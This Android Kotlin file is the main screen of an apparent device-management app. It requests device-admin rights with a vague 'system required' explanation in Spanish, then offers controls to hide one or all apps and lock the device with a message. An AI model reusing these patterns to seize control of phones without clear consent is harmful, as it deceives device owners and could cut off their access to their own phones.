package com.example.mdmjive

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import android.widget.Button
import android.widget.TextView
import android.widget.EditText
import android.widget.Toast
import com.example.mdmjive.R
import com.example.mdmjive.services.MDMService
import com.example.mdmjive.receivers.MDMDeviceAdminReceiver
import com.example.mdmjive.controls.CommandExecutor
import com.example.mdmjive.network.models.Command

class MainActivity : ComponentActivity() {
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var componentName: ComponentName

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        componentName = ComponentName(this, MDMDeviceAdminReceiver::class.java)

        val statusView: TextView = findViewById(R.id.tvStatus)
        val activateButton: Button = findViewById(R.id.btnActivate)
        val packageField: EditText = findViewById(R.id.etPackageName)
        val btnHideApp: Button = findViewById(R.id.btnHideApp)
        val btnHideAll: Button = findViewById(R.id.btnHideAll)
        val btnLock: Button = findViewById(R.id.btnLockDevice)
        val executor = CommandExecutor(this)

        updateStatus(statusView)

        activateButton.setOnClickListener {
            if (!devicePolicyManager.isAdminActive(componentName)) {
                requestAdminPrivileges()
            } else {
                startMDMService()
                Toast.makeText(this, getString(R.string.service_started), Toast.LENGTH_SHORT).show()
                updateStatus(statusView)
            }
        }

        btnHideApp.setOnClickListener {
            val pkg = packageField.text.toString()
            if (pkg.isNotEmpty()) {
                executor.hideApp(pkg)
            }
        }

        btnHideAll.setOnClickListener { executor.hideAllApps() }

        btnLock.setOnClickListener { executor.lockDevice(getString(R.string.lock_message)) }
    }

    private fun updateStatus(view: TextView) {
        val active = devicePolicyManager.isAdminActive(componentName)
        view.text = if (active) getString(R.string.mdm_active) else getString(R.string.mdm_inactive)
    }

    private fun requestAdminPrivileges() {
        try {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Sistema requerido para el funcionamiento del dispositivo")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e("MDM", "Error al solicitar permisos: ${e.message}")
        }
    }

    private fun startMDMService() {
        try {
            val serviceIntent = Intent(this, MDMService::class.java)
            startService(serviceIntent)
            Log.d("MDM", "Servicio MDM iniciado")
        } catch (e: Exception) {
            Log.e("MDM", "Error al iniciar servicio: ${e.message}")
        }
    }

}